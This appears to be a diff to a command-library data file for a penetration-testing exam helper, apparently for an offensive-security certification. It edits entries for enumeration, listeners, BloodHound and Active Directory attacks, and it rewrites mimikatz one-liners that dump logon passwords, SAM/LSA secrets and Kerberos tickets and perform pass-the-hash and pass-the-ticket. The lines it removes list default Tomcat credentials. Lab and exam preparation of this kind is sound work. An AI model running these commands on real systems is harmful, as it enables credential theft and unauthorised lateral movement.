@@ -5,26 +5,12 @@ import type { LibraryCommand } from '../types';
  * do not cover. One `###` block = one entry; `cardId` is the card's frontmatter id, so a card can be re-imported.
  * Run-from comes from the fence title (Kali = attacker, Target/Pivot = target); attacker commands are os 'any'.
  * Tokens are copied verbatim: Raven fills its own, the rest ({PORT}, {FILE}, {PRODUCT}...) show as unresolved.
- * No Metasploit module appears here except multi/handler listeners, which are not limited in the exam, so no entry
- * needs an exam rule except the Nessus start command (banned). Matchers only where the binary and flags name the goal.
+ * Exam: a plain multi/handler listener is not limited, but one that catches Meterpreter spends the exam's one Metasploit
+ * machine, so it carries exam: 'metasploit'; the Nessus start command is banned. Matchers only where the binary and flags name the goal.
  */
 
 export const FIELD_MANUAL_COMMANDS: LibraryCommand[] = [
   // ---------------------------------------------------------------- Unknown-Port-Identification (enum-unknown-port-identification)
-  {
-    id: 'fm-enum-unknown-port-identification-1',
-    title: 'Look up the port number',
-    tool: 'speedguide',
-    template:
-      '"port {PORT} tcp"  →  search SpeedGuide (speedguide.net/port.php?port={PORT}), IANA, and the product docs',
-    os: 'any',
-    runFrom: 'attacker',
-    goals: ['h-enum-identified'],
-    why:
-      'Vendor default ports identify most products instantly; adjacent ports often belong to one product.',
-    source: 'field-manual',
-    cardId: 'enum-unknown-port-identification',
-  },
   {
     id: 'fm-enum-unknown-port-identification-2',
     title: 'Pull the installed-software list over SNMP (if 161/udp is open)',
@@ -383,7 +369,7 @@ export const FIELD_MANUAL_COMMANDS: LibraryCommand[] = [
   {
     id: 'fm-enum-ssh-11',
     title: 'Run sudo -l right after logging in',
-    tool: '-l',
+    tool: 'sudo',
     template: 'sudo -l',
     os: 'any',
     runFrom: 'target',
@@ -1084,20 +1070,6 @@ export const FIELD_MANUAL_COMMANDS: LibraryCommand[] = [
     runFrom: 'attacker',
     goals: ['h-enum-tomcat'],
     why: 'Tells you whether to go for a WAR deploy or fall back to Ghostcat / a version exploit.',
-    source: 'field-manual',
-    cardId: 'web-tomcat',
-  },
-  {
-    id: 'fm-web-tomcat-3',
-    title: 'Try default Tomcat credentials',
-    tool: 'manual',
-    template:
-      'tomcat:tomcat   admin:admin   tomcat:s3cret   admin:(blank)\nrole1:role1     both:tomcat   tomcat:admin    manager:manager',
-    os: 'any',
-    runFrom: 'attacker',
-    goals: ['h-enum-tomcat'],
-    why:
-      'Tomcat ships with commented-out sample accounts that admins frequently enable unchanged.',
     source: 'field-manual',
     cardId: 'web-tomcat',
   },
@@ -2006,18 +1978,6 @@ export const FIELD_MANUAL_COMMANDS: LibraryCommand[] = [
     cardId: 'shell-listeners',
   },
   {
-    id: 'fm-shell-listeners-5',
-    title: 'Upload a file through the penelope menu',
-    tool: 'penelope',
-    template: 'F12\nupload {FILE}',
-    os: 'any',
-    runFrom: 'attacker',
-    goals: ['h-foot-listener'],
-    why: 'Pushes a local file to the target over the existing session without an HTTP server.',
-    source: 'field-manual',
-    cardId: 'shell-listeners',
-  },
-  {
     id: 'fm-shell-listeners-6',
     title: 'Plain netcat listener',
     tool: 'nc',
@@ -2089,6 +2049,7 @@ export const FIELD_MANUAL_COMMANDS: LibraryCommand[] = [
     runFrom: 'attacker',
     goals: ['h-foot-listener'],
     why: 'Required to catch any Meterpreter payload (the AV-evasion and Shellter labs used this).',
+    exam: 'metasploit',
     source: 'field-manual',
     cardId: 'shell-listeners',
   },
@@ -2491,7 +2452,7 @@ export const FIELD_MANUAL_COMMANDS: LibraryCommand[] = [
   {
     id: 'fm-lpe-enumeration-2',
     title: 'List sudo rights',
-    tool: '-l',
+    tool: 'sudo',
     template: 'sudo -l',
     os: 'linux',
     runFrom: 'target',
@@ -4080,7 +4041,7 @@ export const FIELD_MANUAL_COMMANDS: LibraryCommand[] = [
     title: 'mimikatz — cached hashes, plaintext, and tickets',
     tool: 'mimikatz',
     template:
-      '.\\mimikatz.exe\nmimikatz # privilege::debug\nmimikatz # log dump.txt\nmimikatz # sekurlsa::logonpasswords\nmimikatz # sekurlsa::tickets /export',
+      '.\\mimikatz.exe "privilege::debug" "log dump.txt" "sekurlsa::logonpasswords" "sekurlsa::tickets /export" "exit"',
     os: 'windows',
     runFrom: 'target',
     goals: ['h-post-redump'],
@@ -4093,7 +4054,7 @@ export const FIELD_MANUAL_COMMANDS: LibraryCommand[] = [
     title: 'mimikatz — local SAM / LSA secrets / cached domain logons',
     tool: 'mimikatz',
     template:
-      '.\\mimikatz.exe\nmimikatz # privilege::debug\nmimikatz # token::elevate\nmimikatz # log lsa.txt\nmimikatz # lsadump::sam\nmimikatz # lsadump::secrets\nmimikatz # lsadump::cache',
+      '.\\mimikatz.exe "privilege::debug" "token::elevate" "log lsa.txt" "lsadump::sam" "lsadump::secrets" "lsadump::cache" "exit"',
     os: 'windows',
     runFrom: 'target',
     goals: ['h-post-redump'],
@@ -4229,57 +4190,6 @@ export const FIELD_MANUAL_COMMANDS: LibraryCommand[] = [
     runFrom: 'attacker',
     goals: ['h-post-bloodhound'],
     why: 'The zip must reach the CE UI on Kali.',
-    source: 'field-manual',
-    cardId: 'ad-bloodhound-collection-and-analysis',
-  },
-  {
-    id: 'fm-ad-bloodhound-collection-and-analysis-9',
-    title: 'Upload the collection',
-    tool: 'bloodhound',
-    template:
-      'http://localhost:8080/ui → left nav → Quick Upload → select the .zip (or Administration → File Ingest)',
-    os: 'any',
-    runFrom: 'attacker',
-    goals: ['h-post-bloodhound'],
-    why: 'Ingests the zip into the graph.',
-    source: 'field-manual',
-    cardId: 'ad-bloodhound-collection-and-analysis',
-  },
-  {
-    id: 'fm-ad-bloodhound-collection-and-analysis-10',
-    title: 'Mark what you own',
-    tool: 'bloodhound',
-    template:
-      'Explore → SEARCH → type the principal → click result → right-click the node on the canvas → Mark as Owned',
-    os: 'any',
-    runFrom: 'attacker',
-    goals: ['h-post-bloodhound'],
-    why: 'Path queries start from Owned nodes. Mark every user/computer you control immediately.',
-    source: 'field-manual',
-    cardId: 'ad-bloodhound-collection-and-analysis',
-  },
-  {
-    id: 'fm-ad-bloodhound-collection-and-analysis-11',
-    title: 'Run the first pre-built queries',
-    tool: 'bloodhound',
-    template:
-      'Explore → CYPHER → saved queries: "All Domain Admins", "Kerberoastable users", "AS-REP Roastable users", "Shortest paths to Domain Admins", "Shortest path from Owned objects to Tier Zero"',
-    os: 'any',
-    runFrom: 'attacker',
-    goals: ['h-post-bloodhound'],
-    why: 'Fastest wins: roastable users and DA membership.',
-    source: 'field-manual',
-    cardId: 'ad-bloodhound-collection-and-analysis',
-  },
-  {
-    id: 'fm-ad-bloodhound-collection-and-analysis-12',
-    title: 'Path from a specific owned node to Domain Admins',
-    tool: 'bloodhound',
-    template: 'Explore → PATHFINDING → start: {USER}@{DOMAIN} → end: DOMAIN ADMINS@{DOMAIN}',
-    os: 'any',
-    runFrom: 'attacker',
-    goals: ['h-post-bloodhound'],
-    why: 'One-to-one pathfinding is fast and precise.',
     source: 'field-manual',
     cardId: 'ad-bloodhound-collection-and-analysis',
   },
@@ -4650,7 +4560,7 @@ export const FIELD_MANUAL_COMMANDS: LibraryCommand[] = [
     title: 'Spawn a process as the user (mimikatz, on a Windows foothold)',
     tool: 'mimikatz',
     template:
-      '.\\mimikatz.exe\nmimikatz # privilege::debug\nmimikatz # sekurlsa::pth /user:{USER} /domain:{DOMAIN} /ntlm:{HASH} /run:cmd.exe',
+      '.\\mimikatz.exe "privilege::debug" "sekurlsa::pth /user:{USER} /domain:{DOMAIN} /ntlm:{HASH} /run:cmd.exe" "exit"',
     os: 'windows',
     runFrom: 'target',
     goals: ['e-lat-hash'],
@@ -4702,7 +4612,7 @@ export const FIELD_MANUAL_COMMANDS: LibraryCommand[] = [
     id: 'fm-ad-pass-the-ticket-1',
     title: 'Export all cached tickets (mimikatz)',
     tool: 'mimikatz',
-    template: '.\\mimikatz.exe\nmimikatz # privilege::debug\nmimikatz # sekurlsa::tickets /export',
+    template: '.\\mimikatz.exe "privilege::debug" "sekurlsa::tickets /export" "exit"',
     os: 'windows',
     runFrom: 'target',
     goals: ['e-lat-ticket'],
@@ -4726,7 +4636,7 @@ export const FIELD_MANUAL_COMMANDS: LibraryCommand[] = [
     id: 'fm-ad-pass-the-ticket-3',
     title: 'Inject a .kirbi (mimikatz) and use the service',
     tool: 'mimikatz',
-    template: '.\\mimikatz.exe\nmimikatz # kerberos::purge\nmimikatz # kerberos::ptt {FILE}.kirbi',
+    template: '.\\mimikatz.exe "kerberos::purge" "kerberos::ptt {FILE}.kirbi" "exit"',
     os: 'windows',
     runFrom: 'target',
     goals: ['e-lat-ticket'],
@@ -4760,7 +4670,7 @@ export const FIELD_MANUAL_COMMANDS: LibraryCommand[] = [
   },
   // ---------------------------------------------------------------- Raven-authored (steps the cards do not cover)
   {
-    id: 'fm-raven-neigh-lin',
+    id: 'raven-neigh-lin',
     title: 'Neighbours: ARP cache',
     tool: 'ip',
     template: 'ip neigh',
@@ -4772,7 +4682,7 @@ export const FIELD_MANUAL_COMMANDS: LibraryCommand[] = [
     source: 'raven',
   },
   {
-    id: 'fm-raven-hosts-lin',
+    id: 'raven-hosts-lin',
     title: 'Hosts file',
     tool: 'cat',
     template: 'cat /etc/hosts',
@@ -4783,7 +4693,7 @@ export const FIELD_MANUAL_COMMANDS: LibraryCommand[] = [
     source: 'raven',
   },
   {
-    id: 'fm-raven-conns-lin',
+    id: 'raven-conns-lin',
     title: 'Established connections',
     tool: 'ss',
     template: 'ss -tnp',
@@ -4794,7 +4704,7 @@ export const FIELD_MANUAL_COMMANDS: LibraryCommand[] = [
     source: 'raven',
   },
   {
-    id: 'fm-raven-neigh-win',
+    id: 'raven-neigh-win',
     title: 'Neighbours: ARP cache',
     tool: 'arp',
     template: 'arp -a',
@@ -4805,7 +4715,7 @@ export const FIELD_MANUAL_COMMANDS: LibraryCommand[] = [
     source: 'raven',
   },
   {
-    id: 'fm-raven-hosts-win',
+    id: 'raven-hosts-win',
     title: 'Hosts file',
     tool: 'type',
     template: 'type C:\\Windows\\System32\\drivers\\etc\\hosts',
@@ -4816,7 +4726,7 @@ export const FIELD_MANUAL_COMMANDS: LibraryCommand[] = [
     source: 'raven',
   },
   {
-    id: 'fm-raven-conns-win',
+    id: 'raven-conns-win',
     title: 'Established connections',
     tool: 'netstat',
     template: 'netstat -ano',
@@ -4827,7 +4737,7 @@ export const FIELD_MANUAL_COMMANDS: LibraryCommand[] = [
     source: 'raven',
   },
   {
-    id: 'fm-raven-keytabs-find',
+    id: 'raven-keytabs-find',
     title: 'Find keytab and ccache files',
     tool: 'find',
     template: 'find / \\( -name \'*.keytab\' -o -name \'krb5cc_*\' \\) 2>/dev/null',
@@ -4838,7 +4748,7 @@ export const FIELD_MANUAL_COMMANDS: LibraryCommand[] = [
     source: 'raven',
   },
   {
-    id: 'fm-raven-keytabs-klist',
+    id: 'raven-keytabs-klist',
     title: 'List the tickets in the current cache',
     tool: 'klist',
     template: 'klist',
@@ -4849,7 +4759,7 @@ export const FIELD_MANUAL_COMMANDS: LibraryCommand[] = [
     source: 'raven',
   },
   {
-    id: 'fm-raven-websearch',
+    id: 'raven-websearch',
     title: 'Search the web for a version',
     tool: 'web search',
     template: '{FILL_PRODUCT} {FILL_VERSION} exploit',
@@ -4860,7 +4770,21 @@ export const FIELD_MANUAL_COMMANDS: LibraryCommand[] = [
     source: 'raven',
   },
   {
-    id: 'fm-raven-logging',
+    id: 'raven-users-merge',
+    title: 'Merge every username list into users.txt',
+    tool: 'sort',
+    template: 'sort -u *users*.txt -o users.txt',
+    os: 'any',
+    runFrom: 'attacker',
+    goals: ['h-enum-ad-users'],
+    why:
+      'One de-duplicated list for every later spray and roast; run it after each new source (rid, ldap, kerbrute, mail).',
+    source: 'raven',
+    match: { bins: ['sort'], all: [String.raw`(^|\s)-u(?=\s)`, String.raw`users\S*\.txt`], any: [String.raw`-o\s+users\.txt`] },
+    matchExamples: { hit: ['sort -u *users*.txt -o users.txt', 'sort -u rid-users.txt ldap-users.txt -o users.txt'], miss: ['sort -u hashes.txt -o hashes.txt', 'sort users.txt'] },
+  },
+  {
+    id: 'raven-logging',
     title: 'Log the whole terminal session',
     tool: 'script',
     template: 'script -a session.log',
@@ -4871,7 +4795,7 @@ export const FIELD_MANUAL_COMMANDS: LibraryCommand[] = [
     source: 'raven',
   },
   {
-    id: 'fm-raven-vpn',
+    id: 'raven-vpn',
     title: 'Check the VPN interface is up',
     tool: 'ip',
     template: 'ip -4 addr show tun0',
@@ -4882,7 +4806,7 @@ export const FIELD_MANUAL_COMMANDS: LibraryCommand[] = [
     source: 'raven',
   },
   {
-    id: 'fm-raven-reach',
+    id: 'raven-reach',
     title: 'Check the target answers',
     tool: 'ping',
     template: 'ping -c 2 {TARGET_IP}',
